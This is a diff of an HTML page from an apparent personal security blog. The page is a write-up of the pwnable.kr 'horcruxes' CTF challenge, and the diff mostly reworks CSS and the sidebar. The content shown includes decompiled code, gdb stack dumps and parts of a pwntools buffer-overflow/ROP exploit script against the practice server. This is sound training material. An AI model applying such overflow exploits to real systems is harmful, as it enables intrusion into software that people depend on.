@@ -2,141 +2,7 @@
 <html lang="en">
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
-    <style>
-        body{
-            background-color: #44444E;
-            margin: 0;
-        }
-
-        .top-block {
-            width: 100%;
-            height: 70px;
-            background-color: #4C7B8B;
-            position: fixed;
-            box-sizing: border-box;
-            align-items: center;
-        }
-
-        .Welcome{
-            color: #F9F3EF;
-            position: absolute;
-            font-family: Arial;
-            left:740px;
-            top:10px;
-        }
-
-        .Home{
-            transition-duration: 0.4s;
-            border-radius: 0px;
-            font-size:40px;
-            background-color: #44444E;
-            border: 2px solid #44444E;
-            color:#ffffff;
-            font-family: Arial;
-            top:0px;
-            left:0px;
-            position: absolute;
-            padding: 10px 25px;
-        }
-        .Home:hover{
-            border: 2px solid #4C7B8B;
-            background-color: #4C7B8B;
-            color: #44444E;
-            cursor:pointer;
-        }
-
-        .About{
-            transition-duration: 0.4s;
-            border-radius: 0px;
-            font-size:40px;
-            background-color: #4C7B8B;
-            border: 2px solid #4C7B8B;
-            color:#FFFFFF;
-            font-family: Arial;
-            top:0px;
-            left:158px;
-            position: absolute;
-            padding: 10px 25px;
-        }
-        .About:hover{
-            border: 2px solid #ffffff;
-            background-color: #ffffff;
-            color: #4C7B8B;
-            cursor:pointer;
-        }
-
-        .RootLogo{
-            border-radius: 8px;
-            width:75px;
-            right:10px;
-            top:0px;
-            position: absolute;
-        }
-
-        .sidebar {
-            width: 220px;
-            background-color: #715A5A;
-            color: #F9F3EF;
-            position: fixed;
-            top: 70px;
-            left: 0;
-            height: 100%;
-            padding: 15px;
-            overflow-y: auto;
-        }
-
-        .sidebar summary {
-            cursor: pointer;
-            font-weight: bold;
-            padding: 5px;
-        }
-
-        .sidebar ul {
-            list-style-type: none;
-            padding-left: 15px;
-        }
-
-        .sidebar ul li a {
-            color: #F9F3EF;
-            text-decoration: none;
-        }
-
-        .sidebar ul li a:hover {
-            text-decoration: underline;
-        }
-
-        .main-content {
-            margin-left: 100px;
-            padding: 90px 20px 20px 240px;
-            color: #F9F3EF;
-        }
-
-        .code-block {
-            background-color: #1E1E1E;
-            color: #F9F3EF;
-            border: 2px solid #4C7B8B;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 15px 0;
-            font-family: monospace;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            max-width: 1100px;
-        }
-
-        .terminal-block {
-            background-color: #0D0D0D;
-            color: #00FF7F;
-            border: 2px solid #4C7B8B;
-            border-radius: 8px;
-            padding: 10px;
-            margin: 15px 0;
-            font-family: monospace;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            max-width: 1100px;
-        }
-    </style>
+    <link rel="stylesheet" href="../static/style.css">
     <title>RootBlog</title>
 </head>
 
@@ -149,24 +15,35 @@
     <img class="RootLogo" src="/CyberBlog/static/images/root_logo.png">
 </div>
 <div class="sidebar">
-    <details>
-        <summary>Writeup</summary>
-        <ul>
-            <li><a href="fd.html">pwnable - fd</a></li>
-        </ul>
-        <ul>
-            <li><a href="babygame01.html">picoctf-babygame01</a></li>
-        </ul>
-        <ul>
-            <li><a href="horcruxes.html">pwnable - horcruxes</a></li>
-        </ul>
+    <details open>
+        <summary>Writeups</summary>
+        <details class="sub" open>
+            <summary>pwnable.kr</summary>
+            <ul>
+                <li><a href="fd.html">fd</a></li>
+                <li><a href="horcruxes.html" class="current">horcruxes</a></li>
+            </ul>
+        </details>
+        <details class="sub">
+            <summary>picoCTF</summary>
+            <ul>
+                <li><a href="babygame01.html">babygame01</a></li>
+            </ul>
+        </details>
+        <details class="sub">
+            <summary>ShabakCTF-2021</summary>
+            <ul>
+                <li><a href="babyrisc.html">BabyRISC</a></li>
+            </ul>
+        </details>
     </details>
 </div>
 
 <div class="main-content">
 <h2 style="color:#F9F3EF;">pwnable.kr Challenge: "horcruxes"</h2>
+<p class="post-meta">Published: 08.11.2026</p>
 <p style="color:#F9F3EF;"><strong style="color:#7B9AD1;">Description of the challenge:</strong><br>
-<p>Voldemort concealed his splitted soul inside 7 horcruxes.<br>
+Voldemort concealed his splitted soul inside 7 horcruxes.<br>
 Find all horcruxes, and ROP it!<br>
 
 ssh horcruxes@pwnable.kr -p2222 (pw:guest)</p><br>
@@ -176,8 +53,7 @@ horcruxes<br>
 So we don't have source code - then we will use ghidra to decompile to understand the code:</p>
 
 
-<div class="code-block">
-<pre>
+<div class="code-block"><pre>
 <span style="color:#FF9E4A;">void</span> <span style="color:#A351D1;">init_ABCDEFG</span>(<span style="color:#FF9E4A;">void</span>){
 
   <span style="color:#FF9E4A;">int</span> iVar1;
@@ -215,8 +91,7 @@ So we don't have source code - then we will use ghidra to decompile to understan
 <p>We can see init_ABCDEFG() function is initialize random values for each function values.
     <br>So we can't guess the values - meaning we will have to do smth else.</p>
 
-<div class="code-block">
-<pre>
+<div class="code-block"><pre>
 <span style="color:#FF9E4A;">undefined4</span> <span style="color:#A351D1;">ropme</span>(<span style="color:#FF9E4A;">void</span>)
 
 {
@@ -284,8 +159,7 @@ Let's open gdb to check all the functions we need:
 </p>
 
 
-<div><div class="terminal-block">
-0x0804129d  A
+<div class="terminal-block">0x0804129d  A
 0x080412cf  B
 0x08041301  C
 0x08041333  D
@@ -295,14 +169,13 @@ Let's open gdb to check all the functions we need:
 0x080413fb  main
 0x0804150b  ropme
 0x08041698  init_ABCDEFG
-</code></div>
+</div>
 
 <p>
 Right after we call gets and finish it - after inputting 'A' we can see our input and also the return address <span style="color:#F85828;">0x08041501</span> (which is a return address to continue in main after we finish with ropme ) in <span style="color:#F85828;">0xffffdb3c</span>.
 </p>
 
-<div><div class="terminal-block">
-pwndbg&gt; x/100x $esp
+<div class="terminal-block">pwndbg&gt; x/100x $esp
 0xffffdab0:	0xffffdac4	0xf7ffcb80	0xffffdb38	0x0804154a
 0xffffdac0:	0x08046280	0x41414141	0x41414141	0x41414141
 0xffffdad0:	0x41414141	0x41414141	0x41414141	0x41414141
@@ -312,14 +185,13 @@ pwndbg&gt; x/100x $esp
 0xffffdb10:	0x080451a0	0x00000000	0xf7fb1000	0x08043f90
 0xffffdb20:	0xf7f91c0b	0x08043f90	0x00000004	0x080414f9
 0xffffdb30:	0x080451a0	0x08043f90	0xffffdb58	<span style="color:#F85828;">0x08041501</span>
-</code></div>
+</div>
 
 <p>
 We can overwrite it.
 </p>
 
-<div class="code-block">
-<pre>
+<div class="code-block"><pre>
 <span style="color:#FF9E4A;">void</span> <span style="color:#A351D1;">G</span>(<span style="color:#FF9E4A;">void</span>){
 
   <span style="color:#E2342D;">printf</span>(<span style="color:#00FF7F;">"You found \"Harry Potter\" (EXP +%d)\n"</span>,g);
@@ -336,8 +208,7 @@ As we saw - we need to enter the sum of all a+b+c+d+e+f+g, but its random so if 
 Here's the script for the exploit:
 </p>
 
-<div class="code-block">
-<pre>
+<div class="code-block"><pre>
 <span style="color:#4DA6FF;">from</span> <span style="color:#A351D1;">pwn</span> <span style="color:#4DA6FF;">import</span> *
 
 INT <span style="color:#F85828;">=</span> <span style="color:#FF9E4A;">2</span><span style="color:#F85828;">**</span><span style="color:#FF9E4A;">32</span>
@@ -390,7 +261,7 @@ p.<span style="color:#E2342D;">recvuntil</span>(<span style="color:#00FF7F;">b"H
 p.<span style="color:#E2342D;">sendline</span>(<span style="color:#E2342D;">str</span>(sum).<span style="color:#E2342D;">encode</span>())
 
 flag <span style="color:#F85828;">=</span> p.<span style="color:#E2342D;">recvuntil</span>(<span style="color:#00FF7F;">b'\n'</span>)
-    <span style="color:#E2342D;">print</span>(<span style="color:#00FF7F;">f"flag ============= </span><span style="color:#F85828;">{</span>flag.<span style="color:#E2342D;">decode</span>().<span style="color:#E2342D;">strip</span>()<span style="color:#F85828;">}</span><span style="color:#00FF7F;">"</span>)
+<span style="color:#E2342D;">print</span>(<span style="color:#00FF7F;">f"flag ============= </span><span style="color:#F85828;">{</span>flag.<span style="color:#E2342D;">decode</span>().<span style="color:#E2342D;">strip</span>()<span style="color:#F85828;">}</span><span style="color:#00FF7F;">"</span>)
 
 p.<span style="color:#E2342D;">interactive</span>()
 </pre>
@@ -401,8 +272,7 @@ p.<span style="color:#E2342D;">interactive</span>()
 So when we run our script:
 </p>
 
-<div class="terminal-block">
-$ python3 exploit.py
+<div class="terminal-block">$ python3 exploit.py
 [+] Connecting to pwnable.kr on port 2222: Done
 [*] brainfuck@pwnable.kr:
     Distro    Ubuntu 22.04
